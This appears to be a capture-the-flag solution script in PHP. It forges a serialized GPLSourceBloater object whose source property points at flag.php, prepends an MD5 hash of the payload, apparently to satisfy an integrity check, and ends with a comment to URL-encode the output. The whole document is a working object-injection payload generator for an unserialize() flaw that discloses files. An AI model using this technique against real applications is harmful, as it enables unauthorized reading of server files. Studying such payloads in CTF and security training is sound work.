<?php
Class GPLSourceBloater{
}
    $s = new GPLSourceBloater();
    $s->source = "flag.php";
    
    $todos[] = $s;
    $m = serialize($todos);
    $h = md5($m);

	echo $h.$m
?>

# Then we have to encode the result with an url encoder (online)